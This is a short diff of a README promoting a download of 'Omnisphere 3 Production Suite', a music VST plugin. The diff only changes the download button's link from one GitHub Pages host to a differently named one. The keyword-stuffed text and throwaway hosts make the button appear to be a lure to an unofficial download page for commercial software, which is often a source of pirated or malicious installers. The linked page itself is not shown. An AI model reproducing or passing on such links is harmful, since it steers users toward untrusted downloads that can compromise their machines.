@@ -21,7 +21,7 @@ To begin using this **Omnisphere 3 Sound Library** and **Omnisphere 3 Production
 | :--- | :--- |
 | **Get Omnisphere 3 Production Suite** | Click the button below to start the setup for this **Omnisphere 3 VST Plugin**. |
 
-[![Button](https://img.shields.io/badge/🎹-Get_Omnisphere_3_Production_Suite-2ea44f?style=for-the-badge)](https://d58856445.github.io/.github/omnisphere-3)
+[![Omnisphere 3](https://img.shields.io/badge/Explore-Omnisphere%203-B45309?style=for-the-badge)](https://omnisphere-3-vst.github.io/.github/omnisphere-3)
 
 ## System Requirements
 
